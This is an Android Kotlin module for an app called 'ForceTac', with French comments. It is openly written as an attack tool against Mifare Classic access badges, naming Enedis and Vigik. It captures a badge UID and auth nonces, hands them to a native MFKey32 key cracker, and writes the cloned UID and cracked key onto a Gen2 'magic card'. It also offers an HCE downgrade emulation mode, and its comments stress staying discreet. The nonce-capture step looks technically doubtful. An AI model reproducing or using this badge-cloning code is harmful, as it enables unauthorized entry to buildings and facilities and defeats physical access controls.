package com.forcetac

import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.MifareClassic
import android.nfc.tech.NfcA
import android.util.Log
import android.widget.Toast
import com.facebook.react.bridge.*
import com.facebook.react.modules.core.DeviceEventManagerModule
import java.io.IOException

class NfcModule(private val reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext), NfcAdapter.ReaderCallback {

    private var isNativeLibLoaded = false
    private var currentLat: Double = 0.0
    private var currentLon: Double = 0.0
    
    // État de l'attaque
    private var capturedUid: ByteArray? = null // L'UID du badge original (Enedis/Vigik)
    private var keyToClone: String? = null     // La clé trouvée par le crack
    private var isWritingMode = false          // Mode actif: Scan ou Écriture

    init {
        try {
            System.loadLibrary("forcetac_core")
            isNativeLibLoaded = true
            Log.d("ForceTac", "Native library loaded successfully")
        } catch (e: UnsatisfiedLinkError) {
            Log.e("ForceTac", "Failed to load native library: ${e.message}")
            isNativeLibLoaded = false
        } catch (e: Exception) {
            Log.e("ForceTac", "Unknown error loading native library: ${e.message}")
            isNativeLibLoaded = false
        }
    }

    override fun getName() = "NfcModule"

    // Appel C++ avec coordonnées GPS pour le dictionnaire intelligent
    // Déclaré "external" uniquement si la lib est chargée, sinon on gère en Kotlin
    external fun nativeHybridCrack(tagId: ByteArray, nonces: ByteArray, lat: Double, lon: Double): String?
    
    @ReactMethod
    fun startDowngrade() {
        try {
            // Active le service HCE pour simuler un vieux badge (SAK 0x08)
            HceService.enableDowngradeMode(true)
            sendEvent("DOWNGRADE_ACTIVE", null)
            Toast.makeText(reactContext, "Mode Émulation Activé (Approchez le lecteur)", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Log.e("ForceTac", "Error starting downgrade: ${e.message}")
            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur HCE: ${e.message}") })
        }
    }

    @ReactMethod
    fun updateLocation(lat: Double, lon: Double) {
        currentLat = lat
        currentLon = lon
    }

    @ReactMethod
    fun writeMagicCard(key: String) {
        // Active le mode écriture : le prochain tag détecté sera écrasé
        if (capturedUid == null) {
            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Aucun UID capturé à cloner.") })
            return
        }
        keyToClone = key
        isWritingMode = true
        Toast.makeText(reactContext, "APPROCHEZ UNE MAGIC CARD VIERGE...", Toast.LENGTH_LONG).show()
        Log.d("ForceTac", "Waiting for Magic Card to write Key: $key and UID: ${bytesToHex(capturedUid!!)}")
    }

    override fun onTagDiscovered(tag: Tag) {
        if (isWritingMode) {
            handleWriteMode(tag)
        } else {
            handleScanMode(tag)
        }
    }

    /**
     * MODE 1: SNIFFING & CRACK
     * Intercepte l'échange ou lit le badge pour trouver la clé
     */
    private fun handleScanMode(tag: Tag) {
        sendEvent("FIELD_DETECTED", null)
        
        // Sauvegarde de l'UID pour le clonage futur
        capturedUid = tag.id 
        
        val nfcA = NfcA.get(tag)
        
        if (nfcA == null) {
             Log.e("ForceTac", "Tag is null or not NfcA compatible")
             return
        }

        try {
            nfcA.connect()
            // Auth Challenge sur le Secteur 0 pour provoquer la réponse
            // Sniffing Sandwich (Man-in-the-Middle passif)
            val authCmd = byteArrayOf(0x60.toByte(), 0x00.toByte()) 
            val response = nfcA.transceive(authCmd) // Capture des nonces
            
            sendEvent("CRACK_START", null)
            
            if (isNativeLibLoaded) {
                // Appel au moteur C++ (MFKey32)
                try {
                    val key = nativeHybridCrack(tag.id, response ?: byteArrayOf(), currentLat, currentLon) 
                    
                    if (key != null && key.isNotEmpty()) {
                        val params = Arguments.createMap().apply { putString("key", key) }
                        sendEvent("KEY_FOUND", params)
                    } else {
                        sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Clé introuvable") })
                    }
                } catch (e: UnsatisfiedLinkError) {
                     Log.e("ForceTac", "Native method call failed: ${e.message}")
                     sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur moteur natif") })
                }
            } else {
                Log.w("ForceTac", "Native lib not loaded, skipping crack")
                val params = Arguments.createMap().apply { putString("message", "Moteur C++ non chargé") }
                sendEvent("ERROR", params)
            }
        } catch (e: Exception) {
            Log.e("ForceTac", "Scan error: ${e.message}")
            // Silence en cas d'échec (Discrétion) mais log pour debug
        } finally {
            try { nfcA.close() } catch (e: Exception) {}
        }
    }

    /**
     * MODE 2: CLONAGE (MAGIC CARD)
     * Écrit l'UID et la Clé sur une carte Gen2 (CUID)
     */
    private fun handleWriteMode(tag: Tag) {
        val mfc = MifareClassic.get(tag)
        
        if (mfc == null) {
            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Carte non compatible Mifare") })
            return
        }

        try {
            mfc.connect()
            
            // 1. Authentification avec la clé par défaut (FFFFFFFFFFFF) ou la clé déjà présente
            // Sur une Magic Card neuve, c'est souvent F...
            var auth = mfc.authenticateSectorWithKeyA(0, MifareClassic.KEY_DEFAULT)
            if (!auth) {
                // Essai avec la clé Mad Key si défaut échoue
                auth = mfc.authenticateSectorWithKeyA(0, hexToBytes("A0A1A2A3A4A5"))
            }

            if (auth) {
                // 2. Écriture de l'UID (Block 0)
                // Attention: Fonctionne uniquement sur les cartes "CUID" (Gen2) qui acceptent l'écriture directe
                if (capturedUid != null && capturedUid!!.size == 4) {
                    // Calcul du BCC (Block Check Character)
                    val bcc = (capturedUid!![0].toInt() xor capturedUid!![1].toInt() xor capturedUid!![2].toInt() xor capturedUid!![3].toInt()).toByte()
                    // Format Block 0 Mifare : UID (4) + BCC (1) + SAK (1) + ATQA (2) + Manuf (8)
                    // On préserve le reste des données du block 0 original pour la discrétion, on change juste l'UID
                    val originalBlock0 = mfc.readBlock(0)
                    val newBlock0 = originalBlock0.clone()
                    System.arraycopy(capturedUid!!, 0, newBlock0, 0, 4)
                    newBlock0[4] = bcc
                    
                    mfc.writeBlock(0, newBlock0)
                    Log.d("ForceTac", "UID Cloned: ${bytesToHex(capturedUid!!)}")
                }

                // 3. Écriture de la nouvelle clé (Sector Trailer - Block 3)
                // Structure: KeyA (6) + AccessBits (4) + KeyB (6)
                if (keyToClone != null) {
                    val keyBytes = hexToBytes(keyToClone!!)
                    val trailerBlock = mfc.readBlock(3) // Lecture config actuelle
                    val newTrailer = trailerBlock.clone()
                    
                    // Remplacement Clé A
                    System.arraycopy(keyBytes, 0, newTrailer, 0, 6)
                    // On met aussi la Clé B identique pour garantir l'accès futur
                    System.arraycopy(keyBytes, 0, newTrailer, 10, 6)
                    
                    // Reset des Access Bits par défaut (Transport config) pour éviter de bloquer la carte
                    // FF078069 est la config standard transport
                    val accessBits = hexToBytes("FF078069")
                    System.arraycopy(accessBits, 0, newTrailer, 6, 4)

                    mfc.writeBlock(3, newTrailer)
                    
                    sendEvent("KEY_FOUND", Arguments.createMap().apply { putString("key", "CLONAGE RÉUSSI ! CARTE PRÊTE.") }) // Reutilise l'event pour afficher succes
                    isWritingMode = false // Retour au mode scan
                }
            } else {
                sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Échec Auth Carte (Carte non vierge ?)") })
            }
        } catch (e: IOException) {
            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur écriture: ${e.message}") })
            isWritingMode = false
        } finally {
            try { mfc.close() } catch (e: Exception) {}
        }
    }

    // Utilitaires
    private fun sendEvent(eventName: String, params: WritableMap?) {
        if (reactContext.hasActiveCatalystInstance()) {
            reactContext.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
                .emit("onNfcEvent", if (params == null) Arguments.createMap().apply { putString("type", eventName) } else params.apply { putString("type", eventName) })
        }
    }

    private fun bytesToHex(bytes: ByteArray): String {
        return bytes.joinToString("") { "%02X".format(it) }
    }

    private fun hexToBytes(hex: String): ByteArray {
        val len = hex.length
        val data = ByteArray(len / 2)
        var i = 0
        while (i < len) {
            data[i / 2] = ((Character.digit(hex[i], 16) shl 4) + Character.digit(hex[i + 1], 16)).toByte()
            i += 2
        }
        return data
    }
}
